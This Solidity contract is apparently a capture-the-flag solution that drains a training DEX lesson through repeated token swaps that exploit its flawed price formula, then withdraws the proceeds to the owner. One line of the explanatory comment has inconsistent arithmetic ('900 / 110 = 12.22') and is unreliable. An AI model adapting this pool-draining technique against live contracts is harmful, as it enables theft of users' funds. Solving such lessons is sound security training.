// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../lessons/22-Dex.sol";

contract DexAttack {
    Dex dex;
    address public owner;

    constructor(address dexAddress) public {
        dex = Dex(dexAddress);
        owner = msg.sender;
    }

    //
    /**
     * calling this function results in >= balance of both tokens for this contract
     *
     * amountOut = amountIn * outBalance / inBalance
     * dex initially has 100 of each token
     * let swapAmount = 10 tokens
     *
     * attacker swaps 10 token1 for token2
     * => dex balances: 110, 90
     * => attacker bal:   0, 20
     * attacker swaps 10 token2 for token1
     * => amountOut = 10 * 110 / 90
     * => amountOut = 900 / 110 = 12.22...
     * => dex balances:  98, 100
     * => attacker bal:  12, 10
     * attacker has made 2.22 token1 tokens and has the same token2 balance
     */
    function swap(uint256 swapAmount) internal {
        address token1 = dex.token1();
        address token2 = dex.token2();
        dex.swap(token1, token2, swapAmount);
        dex.swap(token2, token1, swapAmount);
    }

    function attack() public {
        // approve dex to spend tokens
        approve();

        // call swap() with input 10 tokens until dex balance of input token (token1) is < 10 tokens
        uint256 swapAmount = 10 ether;
        address token1 = dex.token1();
        address token2 = dex.token2();
        while (true) {
            swap(swapAmount);
            if (dex.balanceOf(token1, address(dex)) <= swapAmount) {
                break;
            }
        }
        // empty remaining token1 balance from dex
        uint256 finalSwapAmount = dex.balanceOf(token2, address(dex));
        dex.swap(token2, token1, finalSwapAmount);
    }

    function approve() internal {
        dex.approve(address(dex), 2**256 - 1);
    }

    function withdraw() public {
        address token1 = dex.token1();
        address token2 = dex.token2();
        SwappableToken(token1).transfer(owner, dex.balanceOf(token1, address(this)));
        SwappableToken(token2).transfer(owner, dex.balanceOf(token2, address(this)));
    }
}
